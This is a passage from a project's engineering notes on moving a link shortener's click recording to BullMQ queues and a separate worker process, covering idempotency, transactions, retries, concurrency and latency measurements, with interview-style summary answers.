**What it is.** Each BullMQ queue (`click-recording`, `link-cleanup`) is
backed by several Redis data structures, all under keys namespaced by the
queue name: a List for jobs waiting to be picked up (`wait`), a Set for
jobs currently locked by a worker (`active`, each job's data in its own
Hash), a Sorted Set for delayed jobs — scored by the timestamp they become
eligible, which is also what backs both retry backoff delays and
repeatable-job scheduling (`delayed`) — and further Sets/Lists for
`completed`/`failed`.

**Why it exists in this project.** This is what makes at-least-once
delivery and crash recovery possible at all, which is the entire point of
choosing a queue over an unawaited promise (see previous section).

**How it works mechanically.** Moving a job between states — e.g. `wait`
→ `active` when a worker picks it up — happens via a single Lua script
executed atomically on the Redis server. The job's ID is never observable
as "removed from `wait`" without simultaneously being "added to `active`
with a lock and a `lockDuration`," in the same atomic step. That single
fact — which state is this job in, and who owns it — is what makes
stalled-job recovery possible: if a worker crashes or GC-pauses past its
lock's expiry without renewing it, BullMQ's stalled-job checker can
detect the orphaned `active` entry and safely move it back to `wait` for
another attempt, because there's exactly one consistent record of the
job's state, never two independently-updatable structures that could
drift apart.

A naive homemade queue — `LPUSH` to add a job, `BRPOP` to consume one, off
a single plain Redis list — has none of this. `BRPOP` popping a job off
the list _is_ the only record that job ever existed; there's no separate
"active" bookkeeping, no lock, nothing to expire or detect an orphan
against. If the consumer process crashes between the `BRPOP` returning and
the job's effects being durably applied, the job is simply gone — nothing
recorded that it was ever picked up, so nothing can ever notice it needs
retrying. This is exactly why a raw Redis list is unsafe as a job queue
for anything that needs at-least-once delivery: it can silently drop work
on any crash, with no failure signal at all.

**Where it lives in the codebase.** Entirely inside the `bullmq` library
— this project only calls `Queue.add`/`new Worker(...)` and never touches
these Redis structures directly. `src/queues/clickQueue.ts`,
`src/queues/linkCleanupQueue.ts`, `worker/index.ts`.

**Common pitfalls.**

- Building a "queue" out of `LPUSH`/`BRPOP` because it looks simple and
  Redis is already a dependency — it's simple precisely because it skips
  the atomic state-tracking that makes crash recovery possible.
- Assuming a job's presence in Redis alone guarantees it'll be processed
  — durability against a _producer_ crash (the job was written before the
  producer could fail) is different from safety against a _consumer_
  crash mid-processing, which is what the atomic `wait`→`active`
  transition and stalled-job detection specifically provide.

**Production considerations.** The stalled-job checker's polling interval
and lock duration are tunable (BullMQ defaults are sane for this
project's scale and were left as-is — no deployment-config surface was
added this phase); at much higher throughput or with much longer-running
jobs, those defaults would be the first thing to revisit against real
stalled-job frequency data, not speculatively.

**Interview answer.** BullMQ backs each queue with a handful of Redis
data structures — a list for waiting jobs, a set for active ones (each
with a lock), a sorted set for delayed/scheduled ones, and sets for
completed/failed — and moves a job between these states atomically via a
single Lua script, so a job is never observably "removed from waiting"
without simultaneously "added to active with a lock" in the same atomic
step. That's what lets BullMQ detect a stalled job — one whose worker
crashed or hung past its lock's expiry — and safely requeue it, because
there's exactly one consistent record of state and ownership. A naive
`LPUSH`/`BRPOP` queue has none of that: popping the job off the list is
the only record it ever existed, so a consumer crash between popping and
finishing the work loses the job with no trace and no way to detect it.

---

### Producer/consumer separation, and why a separate process

**What it is.** `src/queues/` (the API process) only ever produces jobs;
`worker/` (a separate process) only ever consumes them. Neither imports
application logic from the other — the only file shared between them is
`src/queues/contracts.ts`, the queue names and job payload shape.

**Why it exists in this project.** Splitting cleanly along produce/consume
lines is what makes "the worker is a separate deployable" (see "One repo,
multiple deployables" below) actually true rather than aspirational —
if `worker/` depended on `src/routes/` or vice versa, they couldn't be
built, deployed, or scaled independently even if run as separate
processes.

**How it works mechanically.** `contracts.ts` is deliberately
zero-dependency and side-effect-free: queue name constants and a
`ClickJobData` interface, nothing else. It exists specifically so a typo
in a hand-duplicated queue-name string (`'click-recording'` vs.
`'clickRecording'`) is a compile error instead of two silently disjoint,
empty queues — Redis just treats mismatched names as two unrelated key
namespaces, with no error at all. Everything else the worker needs (its
own config, logger, Postgres pool, Redis connection) is built fresh under
`worker/`, not imported from `src/`.

**Why a separate OS process, not a thread or an in-process poller.**

- A `setInterval`-based poller sharing the API's event loop would compete
  for the same single thread as every HTTP request — a slow or blocked
  click-processing tick adds latency to concurrent requests, and vice
  versa, exactly the coupling Phase 7's synchronous-recording decision was
  trying to _measure_, not accept permanently.
- A Node `worker_thread` shares the process's memory and crash domain —
  an unhandled error or a runaway job could take the HTTP server down
  with it, and it still shares the process's resource limits (one event
  loop budget, one memory ceiling), so it can't be scaled or restarted
  independently of the API.
- A separate OS process gets independent crash isolation (a worker crash
  never takes the API down and vice versa), independent scaling (add
  worker replicas without touching API replica count), independent deploy
  cadence, and its own resource budget — its own Postgres pool `max`
  (`worker/db/pool.ts`), its own memory ceiling. This is exactly what
  `src/db/pool.ts`'s own `max: 10` comment already assumed, since before
  this phase: "10 leaves headroom for ... the separate worker process's
  own pool."

**Where it lives in the codebase.** `src/queues/` (producer),
`worker/` (consumer), `src/queues/contracts.ts` (the shared contract).

**Common pitfalls.**

- Letting the worker import from `src/services/` or `src/routes/` "just
  this once" for convenience — every such import re-couples a deployable
  that's supposed to be independent, and the coupling is easy to add and
  easy to forget was added.
- Assuming a queue alone gives process isolation — it's the _separate
  process_ that gives crash/resource isolation; the queue is what lets two
  isolated processes communicate without directly depending on each
  other.

**Production considerations.** This split is what makes it possible to
run zero, one, or many worker replicas independently of API replica
count later, without touching the API's deployment at all — not exercised
in this phase (no deployment configuration was added), but the
producer/consumer boundary is what makes it possible when it's needed.

**Interview answer.** The worker is a separate OS process, not a thread or
an in-process poller, for isolation on three axes: crash isolation (a bug
in job processing can't take the HTTP server down), resource isolation
(it gets its own Postgres pool and memory budget, sized independently),
and deploy/scale isolation (it can be redeployed or scaled without
touching the API). To make that isolation real rather than aspirational,
`worker/` shares almost nothing with `src/` — just one small, dependency-
free file defining the queue names and job payload shape, so a typo can't
silently create two disconnected queues, but neither process can
accidentally couple to the other's internals.

---

### The `maxRetriesPerRequest` conflict: why BullMQ gets its own connections

**What it is.** Every BullMQ connection needs `maxRetriesPerRequest: null`
— the shared `redis` client from `src/lib/redis.ts` sets
`maxRetriesPerRequest: 1` instead, and BullMQ's `Worker` throws at
construction if that isn't exactly `null`.

**Why it exists in this project.** `Worker` issues blocking commands
internally that must not race ioredis's own per-command retry logic —
`maxRetriesPerRequest: 1` was a deliberate Phase 3 choice so the health
check's `PING` fails fast rather than riding out ioredis's default retry
budget, and that choice is incompatible with what `Worker` needs. This
directly contradicted a claim Phase 3's own Notes.md made ahead of this
phase actually arriving — "the worker phase reuses this exact client" —
which turned out not to hold once BullMQ's actual requirements were in
front of it; see the correction inline in "Phase 3: API Foundation" /
"Why `ioredis`, not `node-redis`."

**How it works mechanically.** Two new, dedicated connections, both built
with `maxRetriesPerRequest: null`:

- `src/queues/connection.ts` — `queueConnection`, used by the API
  process's `Queue` instances (`clickQueue`, `linkCleanupQueue`). A
  `Queue` has no hard requirement here (it issues no blocking commands),
  but it's built the same way anyway, for two reasons: one consistent
  mental model for "any BullMQ connection" rather than a `Queue`-only
  exception to remember, and to avoid coupling this connection's shutdown
  ordering to the unrelated `redis` singleton's (`src/server.ts`'s
  shutdown calls `redis.quit()` unconditionally, with no knowledge a
  `Queue` might have commands in flight — see "Worker graceful shutdown"
  below for the analogous concern on the worker side).
- `worker/redis.ts` — `workerRedis`, shared by every `Worker` instance in
  the worker process (click processor, cleanup processor). Sharing one
  connection across multiple `Worker`s _within the same process_ is
  explicitly fine per BullMQ's guidance — the concern that ruled out
  reusing `src/lib/redis.ts`'s client was specifically about coupling
  across the API's HTTP-lifecycle connection and BullMQ's requirements,
  not about sharing within a single worker process.

**Where it lives in the codebase.** `src/lib/redis.ts` (the original
client, doc comment corrected to point here instead of claiming reuse);
`src/queues/connection.ts`; `worker/redis.ts`.

**Common pitfalls.**

- Assuming "same library" (ioredis) means "same client instance is safe
  to share" — the library choice and the connection's configured options
  are two separate decisions, and BullMQ constrains the second one
  specifically.
- Discovering this the hard way at runtime (`Worker` throws at
  construction) instead of reading BullMQ's connection requirements before
  wiring it up — the failure is at least loud and immediate, not silent.

**Production considerations.** None of this changes at scale — it's a
correctness requirement of the library, not a tunable. What would change
at scale is whether a single shared `workerRedis` connection remains
sufficient once the worker runs many `Worker` instances with high
concurrency each; BullMQ's own guidance on connection pooling per
`Worker` would be the thing to revisit then, against real contention data.

**Interview answer.** BullMQ's `Worker` requires its Redis connection to
have `maxRetriesPerRequest: null` — it issues blocking commands
internally that can't race ioredis's own retry logic — but the shared
Redis client this codebase already had set `maxRetriesPerRequest: 1`
deliberately, for a fast-failing health check. Rather than changing that
client's settings (which would slow down the health check for an
unrelated reason) or making one shared client serve two incompatible
purposes, I gave the API's queue producers and the worker's consumers
each their own dedicated connection, built specifically for BullMQ. That
also avoided coupling BullMQ's shutdown ordering to the existing client's
— closing a `Queue` correctly needs to happen before its connection
quits, which the original shutdown code had no way to know about.

---

### Enqueue failures: why a lost click is acceptable but a failed redirect is not

**What it is.** `enqueueClick` in `src/routes/redirect.ts` is wrapped in
a try/catch that logs and swallows any error — enqueue failure never
propagates to the centralized error middleware, and the redirect always
proceeds to `res.redirect(302, ...)` regardless.

**Why it exists in this project.** `src/services/linkService.ts`'s
cache-aside Redis calls are all try/catch-wrapped and fall through to
Postgres — Redis there is disposable "optional accelerant" over a system
that already works without it. `src/lib/oauthState.ts` treats Redis as
the actual source of truth for OAuth state, so its failures propagate —
Redis there is load-bearing. The click queue sits with `linkService.ts`,
not `oauthState.ts`, but for a slightly different reason than "it's a
cache": it isn't caching anything, and a lost click is a genuinely lost
write, not a stale read that self-heals. What makes it "accelerant"-
classified anyway is that the thing it's an accelerant _for_ is the
redirect itself, not click accuracy — the redirect's job is getting the
visitor to `destinationUrl`, and click recording is a side effect of
that, not a precondition for it. Losing a click on a Redis outage is a
bounded, self-contained failure (one click, one link, one outage window);
failing the redirect on the same outage would turn a Redis blip into a
link-shortener-wide outage, a categorically worse failure for a system
whose entire purpose is "make this link work."

**How it works mechanically.** `redirect.ts` generates `clickId` before
calling `enqueueClick`, `await`s it inside a `try`, logs at `error` level
with `linkId`/`shortCode` on failure (`req.log.error(...)`, not thrown),
and always falls through to the same `res.redirect(302, ...)` call
regardless of which branch ran. Nothing about the response — status,
`Location` header — differs between the success and failure paths.

**Where it lives in the codebase.** `src/routes/redirect.ts` (the
try/catch around `enqueueClick`); `tests/routes/redirect.test.ts` ("an
enqueue failure (e.g. Redis down) does not fail the redirect," mirroring
the existing Redis-down tests for the link-lookup cache in the same
file).

**Common pitfalls.**

- Letting an enqueue failure bubble up through the normal `AppError`
  path "for consistency" — consistency with the rest of the error-
  handling convention is the wrong goal here; the whole point is that this
  one failure must never look like a request failure to the caller.
- Forgetting to log the failure at all once it's swallowed — silently
  eating an error is different from handling it; the log line is what
  keeps a real Redis outage visible (see "Observability" below) even
  though it never surfaces to a client.

**Production considerations.** A sustained Redis outage means every click
during that window is silently lost, with only server-side logs
recording it — there is no retry or backlog for enqueue failures
specifically (only _processing_ failures get BullMQ's retry/backoff, once
a job has actually been enqueued). This is the deliberate trade: an
enqueue-retry-with-backoff scheme would either block the redirect while
retrying (defeating the entire point) or need its own separate durable
buffer to retry from later — which is just reinventing a second queue in
front of the first one.

**Interview answer.** A failure to enqueue a click is logged and
swallowed, never allowed to fail the redirect — the redirect's job is
getting the visitor to their destination, and click recording is a side
effect of that, not a precondition. I classified this the same way this
codebase already classifies its Redis cache (log and fall through, never
fail the request) rather than the way it classifies OAuth state in Redis
(a hard dependency whose failures propagate), even though a lost click
isn't really a "cache miss" the way a lookup is — the reasoning that
carries over is about what the failure is _for_: a Redis blip should cost
this system one click, not the entire redirect path.

---

### Measuring the redirect path: before and after

**What it is.** Two paired latency measurements, mirroring Phase 7 and
Phase 8's exact methodology: `process.hrtime.bigint()`, 300 iterations
after a 20-iteration warmup, median latency, via a throwaway script
written once and deleted afterward — not kept as unused infrastructure,
same precedent as `scripts/benchmarkLinkCache.ts` in Phase 8.

**Why it exists in this project.** Optimizing before measuring means
never actually knowing whether a change made a meaningful difference —
the same principle that kept click recording synchronous in Phase 7 in
the first place, specifically so this phase would have a real number to
compare against rather than an assumption.

**How it works mechanically, and what the measurement showed.** Rather
than reusing Phase 8's backward-cited "~1.7ms end-to-end" figure as
"before" (that number was a citation _in_ Phase 8, not something Phase 7
documented with its own iteration count/warmup — see Phase 7's own
"Synchronous side effects" section), this phase re-measured both "before"
and "after" freshly, under the same methodology, so the comparison is
apples-to-apples rather than reusing an unaudited older number. "Before"
was reconstructed by temporarily substituting the exact two-statement
write `recordClick` used to run in place of the real `clickQueue.add`
call, so the _same_ route handler code path was exercised either way —
only the click-recording primitive underneath it changed, which is
exactly what this phase changed architecturally.

| Measurement                              | Before (n=300) | After (n=300) |
| ---------------------------------------- | -------------- | ------------- |
| Isolated write vs. enqueue               | **~0.517ms**   | **~0.222ms**  |
| End-to-end `GET /:shortCode`, warm cache | **~0.989ms**   | **~0.595ms**  |

The isolated-write number (~0.517ms) lines up closely with Phase 7's own
original benchmark (~0.5ms), which is a useful sanity check that this
measurement's methodology is comparable rather than an artifact of a
different environment or approach. A single BullMQ `Queue.add` call —
one Redis round trip writing a job's data plus a small amount of
bookkeeping — costs roughly 2.3x less than two sequential Postgres
statements (`INSERT`, then `UPDATE`) did, which tracks: it's replacing
two network round trips to Postgres with one to Redis. The end-to-end
number reflects a smaller relative improvement than the isolated number
alone would suggest, because most of a warm-cache redirect's total cost
is now the Phase 8 cache lookup and routing/middleware overhead, not the
click-recording step — the write/enqueue step went from being the
dominant cost on this path (Phase 7's framing) to a comparatively minor
one.

**Where it lives in the codebase.** The benchmark script was written,
run, and deleted — the numbers above are the artifact, not the script,
same as Phase 8's `benchmarkLinkCache.ts`.

**Common pitfalls.**

- Citing an old phase's number as "before" without re-measuring, when a
  fresh, directly comparable number is cheap to produce — Phase 8 already
  did this once (backward-citing Phase 7's ~1.7ms without its own
  methodology), which is exactly what this phase avoided repeating.
- Treating the isolated-primitive improvement (2.3x) and the end-to-end
  improvement (about 1.7x) as the same number — they measure different
  things, and conflating them overstates or understates what actually
  changed for a real request.

**Production considerations.** Both local numbers understate the real
benefit for the same reason Phase 8's cache-latency numbers did: over
loopback, Postgres's two round trips and Redis's one round trip are both
close to their respective floors; against a network-attached production
database and Redis instance, the _relative_ gap should be expected to
hold or grow, not shrink, since replacing two remote round trips with one
scales favorably as round-trip time increases.

**Interview answer.** I re-measured before-and-after rather than reusing
an old cited number, using the same methodology Phase 7 and 8 already
established — 300 iterations after warmup, median `hrtime` latency, via a
throwaway script. The isolated click-recording step went from about
0.52ms (two sequential Postgres writes) to about 0.22ms (one BullMQ
enqueue call) — a 2.3x improvement that lines up with Phase 7's original
number, which gave me confidence the comparison was apples-to-apples.
End-to-end, a warm-cache redirect went from about 0.99ms to 0.6ms — a
smaller relative improvement than the isolated number, because most of a
warm redirect's cost is now the cache lookup and middleware, not click
recording, which used to be the dominant cost on this path and now isn't.

---

### Bounded concurrency: worker pool size and BullMQ concurrency

**What it is.** The worker's own `Pool` (`worker/db/pool.ts`) is sized
`max: 10`; the click-processing `Worker`'s `concurrency` option
(`worker/index.ts`) is set to `5`.

**Why it exists in this project.** Unbounded concurrency in a worker
means an unbounded number of simultaneous Postgres connection attempts
under a backlog — exactly the resource-exhaustion risk backpressure
(see "Queues vs. fire-and-forget" above) is supposed to prevent. Bounding
it is what turns "queue depth grew" into a safe, visible signal instead
of a cascading failure.

**How it works mechanically.** Each concurrently-processing job holds one
Postgres connection from the worker's own pool for the duration of its
(now transactional — see "Reintroducing a transaction" below) writes.
`concurrency: 5` against a pool of `max: 10` leaves comfortable headroom
for the cleanup job's own connection use and any transient retry overlap,
without needing to reason carefully about contention. `max: 10` for the
worker's own pool mirrors the API pool's own sizing rationale
(`src/db/pool.ts`'s comment), which had already earmarked exactly this —
"10 leaves headroom for psql/other tooling and the separate worker
process's own pool" — confirming the worker was always expected to have
its own independent pool sized this way, not to share or extend the
API's.

**Where it lives in the codebase.** `worker/db/pool.ts` (`max: 10`);
`worker/index.ts` (`CLICK_WORKER_CONCURRENCY = 5`).

**Common pitfalls.**

- Setting `concurrency` close to or above the pool's `max` — under any
  real backlog, every concurrent job holding a connection would saturate
  the pool with no headroom left for the cleanup job or transient retry
  overlap, turning a processing backlog into a connection-exhaustion
  failure instead of just a growing, visible queue.
- Tuning either number from intuition rather than measurement — these are
  starting points, matching this project's established "measure, don't
  guess" posture (Phase 7/8), not tuned against real throughput data,
  which doesn't exist yet at this project's stage.

**Production considerations.** Given Phase 7's measured per-job write
cost (roughly half a millisecond, and the queue-based version is cheaper
still — see "Measuring the redirect path" above), 5 concurrent workers
can process thousands of jobs per second in principle — far beyond any
realistic click-through rate at this project's current stage. The number
to revisit first at real scale is `concurrency`, guided by real queue-
depth and Postgres-latency data, not `max` — the pool ceiling was already
deliberately sized with this exact use in mind.

**Interview answer.** I set the worker's `Pool` to `max: 10` and its
`Worker` `concurrency` to `5`, leaving roughly half the pool as headroom
for the cleanup job and any transient retry overlap, rather than sizing
concurrency right up against the connection ceiling. Given each job is a
cheap two-statement transaction, that's already far more throughput than
this project's realistic click volume needs — these are deliberately
starting points to revisit against real measured throughput and queue-
depth data later, not numbers I tuned from intuition, matching how this
project has approached every other performance decision so far.

---

### Idempotency: why a job can run twice, and what closes it

**What it is.** At-least-once delivery — the guarantee a real queue
provides instead of the strictly-weaker "probably delivered once" an
unawaited promise gives — means a job can genuinely run more than once: a
worker's lock expires mid-job (a crash, a GC pause past `lockDuration`)
and BullMQ hands the job to another attempt while the original might
still be finishing; a retry fires after what was actually a successful
attempt whose acknowledgment was lost; a redeploy lands mid-processing.
Running the click-write job twice, naively, means one real click gets
counted as two.

**Why it exists in this project.** The task brief asked for this
analyzed properly, not hand-waved, so here are the four options actually
weighed:

- **(a) A deterministic BullMQ `jobId` alone.** Deduplicates repeated
  _enqueue_ attempts — `.add()` called twice with the same `jobId` is a
  no-op while the original job's record still exists in Redis. It does
  **not** protect against duplicate _processing_ of a job that was only
  ever enqueued once, which is the actual practical risk described above.
  Necessary, not sufficient.
- **(b) A natural key / unique constraint alone.** There's no natural key
  for a click event to begin with — nothing about a click is inherently
  deduplicable without first having a deterministic identifier attached to
  it. Only meaningful combined with (a).
- **(c) Accept double-counting as tolerable.** Rejected, and deliberately
  not treated as equivalent to the small undercount risk Phase 7 already
  accepted for the non-transactional write. Phase 7's accepted risk (a
  crash in the sub-millisecond gap between `INSERT` and `UPDATE`) is a
  rare, **self-limiting, bounded undercount** — never more than the number
  of clicks physically mid-flight at the instant of a crash, and it never
  compounds. Duplicate job processing from a stalled lock is a
  **permanent, non-self-correcting overcount** instead: a phantom `clicks`
  row that Postgres — the documented source of truth — shows forever in
  any query, plus a permanent extra increment to `click_count`. That's a
  materially worse failure mode than the one already accepted, so it
  fails the same "how contained is this" test that got the earlier risk
  accepted.
- **(d) Combine (a) and (b) — chosen.** `redirect.ts` generates `clickId`
  once, at enqueue time, and reuses it as both the BullMQ `jobId`
  (enqueue-level dedup) _and_ a new `clicks.job_id` column with a `UNIQUE`
  constraint (processing-level dedup), via
  `INSERT ... ON CONFLICT (job_id) DO NOTHING`. The `click_count`
  increment is conditioned on whether that insert actually inserted a row
  — both statements run inside one transaction (see "Reintroducing a
  transaction" below), so a crash between the insert committing and the
  update running can never happen.

**How it works mechanically.**

```sql
INSERT INTO clicks (job_id, link_id, referrer, user_agent)
VALUES ($1, $2, $3, $4)
ON CONFLICT (job_id) DO NOTHING
RETURNING id
```

If `rowCount === 0` (a duplicate `job_id` already exists), the `UPDATE
links SET click_count = click_count + 1` is skipped entirely — the second
attempt at a given `clickId` is a true no-op, not just a harmless extra
row. A dedicated `job_id` column was used rather than overriding `clicks.
id` itself, because reusing `id` would conflate "row identity" with
"idempotency key" — every other table in this codebase treats `id` as an
opaque, server-generated primary key, and quietly making `clicks` the one
exception is easy to forget and hard to debug later. `job_id` defaults to
`gen_random_uuid()` purely so the `ALTER TABLE` that added it never
conflicts against pre-existing rows; every row written going forward
supplies its own value explicitly.

**Exact residual risk, stated precisely.** This design protects against
any duplicate _processing_ of a job carrying a given `clickId` — a
stalled lock, a lost-ack retry, a crash mid-job all leave `clicks` and
`click_count` consistent, because the second attempt's insert safely
no-ops and the conditional update never fires for it, enforced by
Postgres itself regardless of how the two attempts race. It does **not**,
and cannot, protect against a producer-side bug that generates two
_different_ `clickId`s for what a human would consider one physical click
— neither BullMQ nor Postgres has any way to know two distinct UUIDs
refer to "the same" real-world event; the dedup key is only as
trustworthy as the code that generates it. Also worth being precise
about: BullMQ's own `jobId` dedup specifically only holds while the
original job's record still exists in Redis — `removeOnComplete`'s
count-bounded retention (see "Retries, backoff, and job retention" below)
means a completed job can eventually be evicted, after which a
theoretical re-`.add()` with the same `jobId` would look like a brand-new
job to BullMQ. The Postgres `UNIQUE (job_id)` constraint is the actual,
unconditional backstop — which is exactly why both layers are used rather
than relying on BullMQ's dedup alone.

**Where it lives in the codebase.** `src/routes/redirect.ts`
(`clickId` generation); `src/queues/clickQueue.ts` (`jobId: data.clickId`
on enqueue); `worker/processors/clickProcessor.ts` (the conditional
insert/update); `migrations/20260818060941680_add-job-id-to-clicks.ts`
(the `job_id` column and `UNIQUE` constraint); `tests/worker/
clickProcessor.test.ts` ("processing the same job twice is a no-op the
second time").

**Common pitfalls.**

- Trusting BullMQ's `jobId` dedup as the complete guarantee — it's a
  time-bounded optimization (bounded by job retention), not an
  unconditional one; the Postgres constraint is what actually closes the
  gap.
- Generating the idempotency key inside the _worker_ instead of the
  _producer_ — if the worker generated its own key per processing
  attempt, every retry of the same logical click would get a _different_
  key, and the whole scheme would protect against nothing. The key has to
  be generated exactly once, at the point the "same click" is first
  identified as such — which is enqueue time, in the producer.
- Reusing a table's primary key as an idempotency key "since it's already
  unique" — conflates two different concerns (row identity vs. dedup
  key) that happen to both want uniqueness for unrelated reasons.

**Production considerations.** If click accuracy ever becomes a hard
security or billing boundary rather than a display counter — the same
condition that would flip Phase 7's transaction decision and Phase 8's
capped-TTL decision — this design's residual risk (a producer bug
generating non-deterministic keys) is the one gap that would need
additional scrutiny: e.g., generating `clickId` deterministically from
request-identifying data rather than a fresh random UUID, so that even a
genuine producer retry converges on the same key rather than depending on
the retry logic itself being bug-free.

**Interview answer.** A queue's at-least-once delivery means a click job
can genuinely run twice — a stalled worker lock, a lost-ack retry, a
crash mid-processing. I closed that with a producer-generated `clickId`,
reused as both the BullMQ `jobId` (a cheap, time-bounded optimization)
and a new unique `job_id` column in Postgres that the worker's insert
targets with `ON CONFLICT DO NOTHING`, conditioning the `click_count`
increment on whether that insert actually happened. I considered relying
on BullMQ's own jobId dedup alone, but that only holds while the original
job's Redis record still exists — bounded by retention — so the Postgres
constraint is the real, unconditional backstop. What this doesn't protect
against, and can't: if a future bug in the producer ever generated two
different `clickId`s for what should be one physical click, both layers
would see two genuine, distinct events — the dedup key is only as
trustworthy as the code that generates it once, at enqueue time.

---

### Reintroducing a transaction, off the hot path

**What it is.** `worker/db/pool.ts`'s `withTransaction` helper — the
exact `BEGIN`/try/`COMMIT`/catch-`ROLLBACK`/finally-`release` pattern
Phase 7 built to benchmark `recordClick`, then deliberately deleted from
`src/db/pool.ts` once that benchmark concluded it wasn't worth keeping on
the redirect's hot path.

**Why it exists in this project.** Phase 7's rejection was about _cost
relative to benefit on that specific path_ — a ~50% latency tax on the
single hottest path in the system, in exchange for a guarantee (`clicks`
and `click_count` never disagreeing across a crash) that only bought
protection against a rare, small, self-limiting undercount. Nothing about
that reasoning transfers unchanged to the worker: the worker isn't on any
request's critical path at all, so the same ~0.25ms extra round-trip
cost that was a real tax there is a complete non-issue here. What
_changed_ the calculus isn't the cost side, it's the benefit side —
idempotency (see previous section) genuinely needs the insert and the
conditional update to commit or roll back together, or a crash between
them could leave a click permanently under-counted despite having "run"
successfully.

**How it works mechanically.** Reintroduced verbatim in `worker/db/
pool.ts`, not resurrected in `src/db/pool.ts` — nothing in the API
process needs it, and putting it there would reintroduce exactly the
unused-infrastructure smell Phase 7 avoided by deleting it in the first
place. `processClickJob` wraps its insert-then-conditional-update in
`withTransaction`, so both statements commit together or neither does.

**Where it lives in the codebase.** `worker/db/pool.ts`
(`withTransaction`); `worker/processors/clickProcessor.ts` (its one
caller).

**Common pitfalls.**

- Treating "we already decided against a transaction here" as a
  permanent, context-independent conclusion, rather than a conclusion
  scoped to the specific cost/benefit tradeoff that produced it — the
  constraint that drove Phase 7's rejection (hottest path in the system)
  simply doesn't hold for a background worker.
- Duplicating the transaction helper into `src/db/pool.ts` "just in case"
  instead of keeping it exactly where its one caller lives — the same
  "don't keep unused infrastructure around" principle that got it deleted
  the first time still applies to _where_ it lives, not just _whether_ it
  exists.

**Production considerations.** None — this is a settled, low-cost
decision for a non-latency-critical path; there's no future condition
under which reverting to non-transactional writes here would make sense,
unlike Phase 7's redirect-path decision, which has an explicit reversal
condition (`click_count` becoming a hard boundary).

**Interview answer.** Phase 7 explicitly rejected a transaction for this
same insert-then-update pair, on the redirect's hot path, because the
~50% latency tax wasn't worth the narrow guarantee it bought. I
reintroduced the exact same helper in the worker, not because that
earlier reasoning was wrong, but because it was scoped to a constraint —
"this is the hottest path in the system" — that simply doesn't apply to a
background job. What changed is the benefit side, not the cost side:
idempotency needs the insert and the conditional counter update to
succeed or fail together, and a background job can afford the extra
network round trip that the redirect path genuinely couldn't.

---

### Retries, exponential backoff, and job retention

**What it is.** `src/queues/clickQueue.ts`'s default job options:
`attempts: 5`, `backoff: { type: 'exponential', delay: 1000 }`,
`removeOnComplete: { count: 5000 }`, `removeOnFail: { count: 10000 }`.

**Why it exists in this project.** Retries are what turn a transient
failure (a Postgres restart, a brief pool-exhaustion spike) into "the job
eventually succeeds" instead of "the click is silently lost" — but
retrying forever against a genuinely broken dependency would just mean
every job eventually fails anyway, after wasting time. Job retention
exists because a completed-job record is only useful for a while (recent-
throughput visibility) and unbounded retention of one record per click
processed is real, unbounded Redis memory growth.

**How it works mechanically.** Five attempts, exponential backoff
starting at 1 second (1s, 2s, 4s, 8s, 16s between attempts), gives a
transient blip roughly 30+ seconds to resolve before the job is given up
on and lands in the `failed` set — long enough to ride out a Postgres
restart or a brief spike, short enough that a genuinely broken dependency
doesn't retry indefinitely. `removeOnComplete: { count: 5000 }` keeps a
rolling window of the most recent 5000 successes (enough to eyeball
recent throughput) without growing forever; `removeOnFail: { count:
10000 }`, larger and separate from completed, because a failed job —
one that exhausted every retry — is exactly the kind of thing that needs
to stay inspectable, not be discarded as eagerly as a routine success.
Failed jobs are never silently discarded — they land in, and stay in
(bounded by that count), the `failed` set, which functions as this
system's dead-letter queue: inspectable via `Queue.getFailed()`, without
needing a second, separate queue for the concept.

**Where it lives in the codebase.** `src/queues/clickQueue.ts`
(`defaultJobOptions`); `src/queues/linkCleanupQueue.ts` (a smaller,
fixed `{ count: 100 }` for both — cleanup runs are infrequent, so a small
fixed history is plenty for debugging); `worker/index.ts` (the `'failed'`
event listener logs `attemptsMade`/`willRetry`, distinguishing "will
retry" from "landed in failed" — see "Observability" below).

**Common pitfalls.**

- Retrying with a fixed delay instead of exponential backoff — a fixed
  delay hammers a struggling dependency at a constant rate instead of
  backing off as it becomes clearer something is actually wrong, not just
  transiently slow.
- Leaving `removeOnComplete`/`removeOnFail` unset (unbounded) "to be
  safe" — for a queue processing one job per click, unbounded retention
  is a slow, easy-to-miss memory leak in Redis, not a safety margin.
- Treating a job that landed in `failed` as equivalent to "lost forever"
  — it's inspectable and (with BullMQ's retry-from-failed tooling)
  re-triggerable; the retention count bounds _how long_ it stays
  inspectable, not whether it's recoverable at all before that.

**Production considerations.** These are starting points, matching this
project's "measure, don't guess" posture — `attempts`/`backoff` should be
revisited against real transient-failure frequency and duration once
there's production data on how long Postgres blips actually last;
`removeOnComplete`/`removeOnFail` counts should be revisited against real
click volume (5000/10000 could be many hours of history at low volume, or
minutes at very high volume).

**Interview answer.** Failed click jobs retry five times with exponential
backoff starting at one second, giving a transient Postgres problem
roughly thirty seconds to resolve before the job is left in BullMQ's
failed set, which functions as a dead-letter queue — inspectable, not
discarded. I bounded both completed and failed job retention by count
rather than leaving them unlimited, since this queue processes one job
per click and unbounded retention is a genuine, slow Redis memory leak;
failed jobs get a larger retention window than completed ones, since a
job that exhausted every retry is exactly the kind of thing that needs to
stay inspectable longer than a routine success does.

---

### click_count's new worst-case overshoot

**What it is.** Phase 8's capped-link cache TTL (`LINK_CACHE_CAPPED_TTL_
SECONDS = 5`) bounded how far a capped link's `click_count` could
overshoot `maxClicks` before enforcement caught up, on the premise that
Postgres's `click_count` was always current the instant a cache entry was
(re)populated — true when `recordClick` wrote synchronously, in the same
request. That premise no longer holds.

**Why it exists in this project.** There are now two independently-
varying lag sources stacked on top of each other, not one:

1. **Cache lag** (unchanged from Phase 8): up to `LINK_CACHE_CAPPED_TTL_
SECONDS`, fixed and bounded at 5 seconds.
2. **Queue-processing lag** (new this phase): the time between a click
   being enqueued and the worker's transaction committing the increment —
   normally sub-second, but _not_ fixed. It grows with queue depth,
   worsens under retry/backoff (a job that fails and retries can take
   30+ seconds to resolve before either succeeding or landing in
   `failed` and never incrementing at all), and if the worker process is
   down entirely, this lag is genuinely unbounded — jobs simply
   accumulate in `wait` until a worker comes back online.

**How it works mechanically.** The honest worst-case bound is now
"however many clicks arrive within 5 seconds of a cache refresh, **plus**
however many clicks are sitting unprocessed in the queue at that moment."
The first term is still a fixed constant; the second term isn't boundable
at all without operational visibility into queue depth — which is
exactly why queue-depth observability (see "Observability" below) isn't
a nice-to-have here, it's what makes "bounded" an honest claim rather
than a hopeful one. If the worker is down, the original premise behind
accepting this overshoot at all — a small, self-limiting window — breaks
down until someone is alerted to the growing depth and restarts it.

